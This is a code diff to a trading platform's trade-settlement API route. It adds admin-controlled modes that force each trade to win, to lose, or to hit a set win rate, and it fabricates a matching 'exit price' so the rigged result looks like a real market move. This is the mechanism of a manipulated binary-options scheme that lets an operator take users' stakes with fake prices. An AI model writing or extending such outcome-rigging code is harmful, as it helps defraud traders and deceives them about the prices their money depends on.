@@ -44,12 +44,45 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    const exitPrice = coin.basePrice * (1 + (Math.random() - 0.5) * 0.012);
-    const result = settleTrade(
-      trade.direction as "UP" | "DOWN",
-      trade.entryPrice,
-      exitPrice
-    );
+    // Check admin trade control setting
+    const tradeSetting = await db.tradeSetting.findUnique({ where: { id: "global" } }) ?? { mode: "AUTO", winRate: 50 };
+    const tsMode = tradeSetting.mode;
+    const tsWinRate = tradeSetting.winRate;
+
+    let result: "WIN" | "LOSE";
+    let exitPrice: number;
+
+    if (tsMode === "ALWAYS_WIN") {
+      // Force win — move exit price in the favorable direction
+      const drift = coin.basePrice * 0.005;
+      exitPrice = trade.direction === "UP"
+        ? trade.entryPrice + drift
+        : trade.entryPrice - drift;
+      result = "WIN";
+    } else if (tsMode === "ALWAYS_LOSE") {
+      // Force lose — move exit price in the unfavorable direction
+      const drift = coin.basePrice * 0.005;
+      exitPrice = trade.direction === "UP"
+        ? trade.entryPrice - drift
+        : trade.entryPrice + drift;
+      result = "LOSE";
+    } else if (tsMode === "WIN_RATE") {
+      // Percentage-based — random check against winRate
+      const wins = Math.random() * 100 < tsWinRate;
+      const drift = coin.basePrice * 0.005;
+      exitPrice = wins
+        ? (trade.direction === "UP" ? trade.entryPrice + drift : trade.entryPrice - drift)
+        : (trade.direction === "UP" ? trade.entryPrice - drift : trade.entryPrice + drift);
+      result = wins ? "WIN" : "LOSE";
+    } else {
+      // AUTO — natural random market simulation
+      exitPrice = coin.basePrice * (1 + (Math.random() - 0.5) * 0.012);
+      result = settleTrade(
+        trade.direction as "UP" | "DOWN",
+        trade.entryPrice,
+        exitPrice
+      );
+    }
 
     const isWin = result === "WIN";
     const profit = isWin ? trade.amount * trade.payoutRate : -trade.amount;
